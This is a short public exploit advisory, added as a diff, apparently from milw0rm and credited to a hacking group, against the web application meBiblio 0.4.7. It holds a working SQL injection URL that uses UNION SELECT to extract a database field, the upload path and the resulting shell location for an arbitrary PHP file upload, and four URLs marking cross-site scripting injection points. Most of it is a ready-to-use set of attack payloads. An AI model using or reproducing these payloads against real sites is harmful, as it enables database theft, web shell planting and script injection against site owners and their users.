@@ -1,0 +1,64 @@
+========================================================================================
+ meBiblio 0.4.7 Remote SQL Injection/ Arbitrary File Upload Exploit / XSS Vulnerability
+========================================================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+AUTHOR : CWH Underground
+DATE   : 1 June 2008
+SITE   : www.citec.us
+
+
+#####################################################
+ APPLICATION : meBiblio
+ VERSION     : 0.4.7 (Lastest Version)
+ VENDOR      : http://mebiblio.sourceforge.net/ 
+ DOWNLOAD    : http://downloads.sourceforge.net/mebiblio
+#####################################################
+
+---SQL Injection Exploit---
+
+http://[target]/[path]/admin/journal_change_mask.inc.php?JID=1%20union%20select%201,PACS_description,1,1%20FROM%20pacs%20where%20PACS_ID=2
+
+** You will found PACS_description in Journal Long Name's Box **
+
+
+---Arbitrary File Upload Exploit---
+
+[Files Directory must existed]
+
+Upload Path: http://[target]/[path]/upload/uploader.html
+
+Shell Script: http://[target]/[path]/files/evil.php
+
+
+---Multiple Remote XSS Exploit---
+
+[+]dbadd.inc.php
+[+]add_journal_mask.inc.php
+[+]insert_mask.inc.php
+[+]search_mask.inc.php
+
+Example:
+     
+http://[target]/[path]/dbadd.inc.php?sql=<XSS>
+http://[target]/[path]/add_journal_mask.inc.php?InsertJournal=<XSS>
+http://[target]/[path]/insert_mask.inc.php?InsertBibliography=<XSS>
+http://[target]/[path]/search_mask.inc.php?LabelYear=<XSS>
+
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-01]
